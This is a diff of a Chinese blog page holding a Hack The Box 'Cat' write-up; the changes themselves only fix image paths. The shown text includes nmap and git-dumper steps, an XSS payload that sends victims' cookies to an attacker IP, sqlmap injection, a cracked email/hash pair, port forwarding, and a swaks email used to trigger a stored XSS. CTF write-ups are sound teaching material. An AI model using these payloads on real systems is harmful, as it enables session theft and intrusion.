@@ -14,28 +14,28 @@
 <meta property="og:site_name" content="Oceanzbz&#39;s Blog">
 <meta property="og:description" content="信息收集nmap -sC -sV -T4 -Pn 10.10.11.53   加入一下host映射然后访问   扫描下目录   发现存在git泄漏，用git-dumper下载一下。 git-dumper http:&#x2F;&#x2F;cat.htb&#x2F;.git .&#x2F;catgit 发现有源码泄漏那就看看源码有什么值得入手的地方 代码审计xss12345678910111213141516171819202122232">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250215210535347.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250215210736236.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250215210824198.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250215214158441.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250215220402069.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250215220738644.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250215221029523.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250215221247151.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250215221510944.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250215222258084.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250215222419853.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250215222520328.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250215223722094.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250215223110284.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/4da1391d/IMAGE20250215210535347.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/4da1391d/IMAGE20250215210736236.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/4da1391d/IMAGE20250215210824198.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/4da1391d/IMAGE20250215214158441.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/4da1391d/IMAGE20250215220402069.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/4da1391d/IMAGE20250215220738644.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/4da1391d/IMAGE20250215221029523.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/4da1391d/IMAGE20250215221247151.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/4da1391d/IMAGE20250215221510944.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/4da1391d/IMAGE20250215222258084.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/4da1391d/IMAGE20250215222419853.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/4da1391d/IMAGE20250215222520328.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/4da1391d/IMAGE20250215223722094.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/4da1391d/IMAGE20250215223110284.png">
 <meta property="article:published_time" content="2025-02-15T10:49:06.000Z">
-<meta property="article:modified_time" content="2025-03-02T04:40:31.835Z">
+<meta property="article:modified_time" content="2025-03-05T07:24:36.808Z">
 <meta property="article:author" content="Oceanzbz">
 <meta property="article:tag" content="渗透测试">
 <meta property="article:tag" content="HTB">
 <meta property="article:tag" content="Linux">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250215210535347.png">
+<meta name="twitter:image" content="https://oceanzbz.github.io/post/4da1391d/IMAGE20250215210535347.png">
     
     
       
@@ -200,13 +200,13 @@
 
   <div class="content e-content" itemprop="articleBody">
     <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><code>nmap -sC -sV -T4 -Pn 10.10.11.53</code></p>
-<img src="/post/undefined/IMAGE20250215210535347.png" class="">
+<img src="/post/4da1391d/IMAGE20250215210535347.png" class="">
 
 <p>加入一下host映射然后访问</p>
-<img src="/post/undefined/IMAGE20250215210736236.png" class="">
+<img src="/post/4da1391d/IMAGE20250215210736236.png" class="">
 
 <p>扫描下目录</p>
-<img src="/post/undefined/IMAGE20250215210824198.png" class="">
+<img src="/post/4da1391d/IMAGE20250215210824198.png" class="">
 
 <p>发现存在git泄漏，用git-dumper下载一下。</p>
 <p><code>git-dumper http://cat.htb/.git ./catgit</code></p>
@@ -217,7 +217,7 @@
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="variable language_">this</span>.<span class="property">src</span>=<span class="string">&quot;http://10.10.16.8/?ocean=&quot;</span>+<span class="built_in">encodeURIComponent</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)&gt;</span><br></pre></td></tr></table></figure>
 
 <p>等待管理员访问，然后监听80端口获取cookie</p>
-<img src="/post/undefined/IMAGE20250215214158441.png" class="">
+<img src="/post/4da1391d/IMAGE20250215214158441.png" class="">
 
 <p>然后替换管理员cookie登录即可。不过进入后台发现也没有什么可以利用的点继续去看看代码有其他的漏洞吗</p>
 <h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;axel&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;catId&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;catName&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$cat_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;catName&#x27;</span>];</span><br><span class="line">            <span class="variable">$catId</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;catId&#x27;</span>];</span><br><span class="line">            <span class="variable">$sql_insert</span> = <span class="string">&quot;INSERT INTO accepted_cats (name) VALUES (&#x27;<span class="subst">$cat_name</span>&#x27;)&quot;</span>;</span><br><span class="line">            <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$sql_insert</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$stmt_delete</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;DELETE FROM cats WHERE cat_id = :cat_id&quot;</span>);</span><br><span class="line">            <span class="variable">$stmt_delete</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:cat_id&#x27;</span>, <span class="variable">$catId</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line">            <span class="variable">$stmt_delete</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;The cat has been accepted and added successfully.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Error: Cat ID or Cat Name not provided.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Access denied.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -225,41 +225,41 @@
 <p>在accept_cat.php文件中存在sql注入在insert语句cat_name可控并且没用使用预编译语句,所以用sqlmap跑一下</p>
 <p><code>sqlmap -r 1.post --risk 3 --level 5 --batch --dbms sqlite</code></p>
 <p>这里sqlite数据库在配置文件中有提现</p>
-<img src="/post/undefined/IMAGE20250215220402069.png" class="">
+<img src="/post/4da1391d/IMAGE20250215220402069.png" class="">
 
 <p>继续盲注得到用户密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rosamendoza485@gmail.com      ac369922d560f17d6eeb8b2c7dec498c</span><br></pre></td></tr></table></figure>
 
 <p>拿去破解下这个密码</p>
-<img src="/post/undefined/IMAGE20250215220738644.png" class="">
+<img src="/post/4da1391d/IMAGE20250215220738644.png" class="">
 
 <p>然后使用rosa用户登录,但是发现并没有用户的flag。</p>
-<img src="/post/undefined/IMAGE20250215221029523.png" class="">
+<img src="/post/4da1391d/IMAGE20250215221029523.png" class="">
 
 <p>发现还有几个用户，考虑提权</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><img src="/post/undefined/IMAGE20250215221247151.png" class="">
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><img src="/post/4da1391d/IMAGE20250215221247151.png" class="">
 
 <p>看了下端口发现3000存在服务转发一下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 3000:127.0.0.1:3000 rosa@cat.htb</span><br></pre></td></tr></table></figure>
 
-<img src="/post/undefined/IMAGE20250215221510944.png" class="">
+<img src="/post/4da1391d/IMAGE20250215221510944.png" class="">
 
 <p>去找一下exp</p>
 <p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/52077">https://www.exploit-db.com/exploits/52077</a> 存在xss，但是这里要求登录才能继续利用该漏洞</p>
 <p>那么我们继续返回shell中去找找其他用户有没有泄漏的密码啥的</p>
-<img src="/post/undefined/IMAGE20250215222258084.png" class="">
+<img src="/post/4da1391d/IMAGE20250215222258084.png" class="">
 
 <p>看apache的日志找到另一个用户的密码</p>
-<img src="/post/undefined/IMAGE20250215222419853.png" class="">
+<img src="/post/4da1391d/IMAGE20250215222419853.png" class="">
 
 <p>拿到flag，然后继续利用刚才的漏洞看看能否提权</p>
-<img src="/post/undefined/IMAGE20250215222520328.png" class="">
+<img src="/post/4da1391d/IMAGE20250215222520328.png" class="">
 
 <p>登录进来之后，新建一个respo然后在描述信息里加上payload</p>
-<img src="/post/undefined/IMAGE20250215223722094.png" class="">
+<img src="/post/4da1391d/IMAGE20250215223722094.png" class="">
 
 <p>至于为什么我也看的别的师傅的博客是在邮件里有一段描述</p>
-<img src="/post/undefined/IMAGE20250215223110284.png" class="">
+<img src="/post/4da1391d/IMAGE20250215223110284.png" class="">
 
 <p>然后发送邮件给jobert 坚听端口获得 信息,这里需要也把邮件的端口转发出来</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swaks --to &quot;jobert@localhost&quot; --from &quot;axel@localhost&quot; --header &quot;Click&quot; --body &quot;http://localhost:3000/axel/test&quot; --server localhost</span><br></pre></td></tr></table></figure>
